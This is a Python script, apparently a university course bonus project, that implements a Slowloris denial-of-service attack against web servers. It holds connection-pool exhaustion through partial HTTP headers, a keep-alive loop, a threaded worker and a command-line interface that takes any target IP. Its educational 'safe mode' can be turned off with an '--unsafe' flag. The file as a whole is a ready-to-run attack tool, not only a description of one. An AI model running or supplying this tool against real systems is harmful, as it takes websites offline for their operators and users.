#!/usr/bin/env python3
"""
SecureNet DC - Slowloris Attack Simulator
CPEG 460 Bonus Project

Simulates Slowloris attack for educational purposes.
This attack keeps many connections open by slowly sending
partial HTTP headers, exhausting server connection pools.

WARNING: For educational use only in controlled environments.
"""

import socket
import time
import random
import threading
import logging

logger = logging.getLogger(__name__)


class Slowloris:
    """
    Slowloris Attack Simulator.

    Opens many connections to a web server and keeps them alive
    by sending partial HTTP headers at slow intervals, exhausting
    the server's connection capacity.
    """

    def __init__(self, target_ip, target_port=80, safe_mode=True):
        """
        Initialize Slowloris attack.

        Args:
            target_ip: Target IP address
            target_port: Target port (default: 80)
            safe_mode: Limit attack intensity (default: True)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.safe_mode = safe_mode
        self.running = False
        self.sockets = []
        self.max_sockets = 50 if safe_mode else 500
        self.socket_count = 0
        self.requests_sent = 0

        logger.info(f"Slowloris initialized: target={target_ip}:{target_port}")

    def _create_socket(self):
        """Create and connect a socket to the target."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_ip, self.target_port))

            # Send partial HTTP request
            sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {self.target_ip}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
            sock.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
            # Don't send final \r\n to keep connection open

            return sock
        except socket.error as e:
            logger.debug(f"Failed to create socket: {e}")
            return None

    def _send_keep_alive(self, sock):
        """Send a keep-alive header to maintain connection."""
        try:
            sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            return True
        except socket.error:
            return False

    def _socket_worker(self):
        """Worker thread to manage sockets."""
        while self.running:
            # Create new sockets up to max
            while len(self.sockets) < self.max_sockets and self.running:
                sock = self._create_socket()
                if sock:
                    self.sockets.append(sock)
                    self.socket_count += 1
                else:
                    time.sleep(0.5)

            # Send keep-alive headers
            new_sockets = []
            for sock in self.sockets:
                if self._send_keep_alive(sock):
                    new_sockets.append(sock)
                    self.requests_sent += 1
                else:
                    try:
                        sock.close()
                    except:
                        pass

            self.sockets = new_sockets

            # Wait before next round
            time.sleep(random.uniform(5, 15))

    def start(self, duration=60, connections=None, callback=None):
        """
        Start the Slowloris attack.

        Args:
            duration: Attack duration in seconds
            connections: Number of connections to maintain
            callback: Progress callback function

        Returns:
            dict: Attack statistics
        """
        if connections:
            if self.safe_mode and connections > self.max_sockets:
                self.max_sockets = 50
                logger.warning(f"Safe mode: Connections limited to {self.max_sockets}")
            else:
                self.max_sockets = connections

        self.running = True
        self.sockets = []
        self.socket_count = 0
        self.requests_sent = 0
        start_time = time.time()

        logger.warning(f"[!] Starting Slowloris against {self.target_ip}:{self.target_port}")
        logger.warning(f"[!] Duration: {duration}s, Max connections: {self.max_sockets}")

        # Start worker thread
        worker = threading.Thread(target=self._socket_worker)
        worker.daemon = True
        worker.start()

        try:
            while self.running and (time.time() - start_time) < duration:
                # Progress callback
                if callback:
                    elapsed = time.time() - start_time
                    callback({
                        'active_connections': len(self.sockets),
                        'total_connections': self.socket_count,
                        'requests_sent': self.requests_sent,
                        'elapsed': elapsed
                    })

                time.sleep(1)

        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        finally:
            self.running = False

            # Close all sockets
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
            self.sockets = []

        elapsed = time.time() - start_time
        stats = {
            'attack_type': 'SLOWLORIS',
            'target': f"{self.target_ip}:{self.target_port}",
            'duration': elapsed,
            'total_connections': self.socket_count,
            'peak_connections': self.max_sockets,
            'requests_sent': self.requests_sent
        }

        logger.info(f"[+] Attack complete: {self.socket_count} connections, "
                   f"{self.requests_sent} keep-alives")
        return stats

    def stop(self):
        """Stop the attack."""
        self.running = False
        logger.info("Slowloris stopped")


def main():
    """Command-line interface for Slowloris."""
    import argparse

    parser = argparse.ArgumentParser(
        description='Slowloris Attack Simulator (Educational)'
    )
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80,
                       help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Duration in seconds (default: 60)')
    parser.add_argument('-c', '--connections', type=int, default=50,
                       help='Number of connections (default: 50)')
    parser.add_argument('--unsafe', action='store_true',
                       help='Disable safe mode')

    args = parser.parse_args()

    attack = Slowloris(args.target, args.port, safe_mode=not args.unsafe)
    attack.start(duration=args.duration, connections=args.connections)


if __name__ == '__main__':
    main()
